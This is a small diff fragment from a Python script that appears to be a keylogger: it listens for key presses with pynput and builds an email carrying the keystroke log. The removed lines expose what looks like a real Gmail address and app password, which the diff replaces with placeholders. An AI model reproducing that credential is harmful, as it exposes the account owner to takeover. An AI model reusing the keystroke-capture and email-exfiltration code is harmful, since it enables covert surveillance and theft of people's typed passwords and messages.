@@ -47,8 +47,8 @@ with Listener(on_press=on_press,on_release=on_release) as listener:
     listener.join()
 
 subject="log-"+now
-m="prithik2001@gmail.com"
-passwd="lukcvdnmjcsawamc"
+m="your-mail"
+passwd="pass"
 
 mes=MIMEMultipart()
 mes["From"]=m
